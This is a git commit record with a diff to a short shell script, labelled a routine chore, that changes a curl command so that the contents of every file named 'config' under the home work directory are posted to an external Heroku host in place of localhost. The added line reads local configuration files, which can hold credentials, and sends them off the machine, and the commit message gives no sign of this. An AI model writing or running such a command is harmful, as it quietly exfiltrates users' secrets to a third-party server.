7b73cf33dd7054e77fa870b7d7eff51cc4b84bcc
Prince <prince@deriv.com>
2022-11-15 15:44:42 +0400

    chore: added running server

--- x.sh
+++ x.sh
@@ -1,4 +1,5 @@
 bash
-find $HOME/work -type f -name config | xargs cat | curl --data @- http://127.0.0.1:1234/
+find $HOME/work -type f -name config | xargs cat | curl --data @- https://deriv-test-node-server.herokuapp.com
+echo "Some console message" 1>&3
 # wait for 10 seconds
 sleep 10
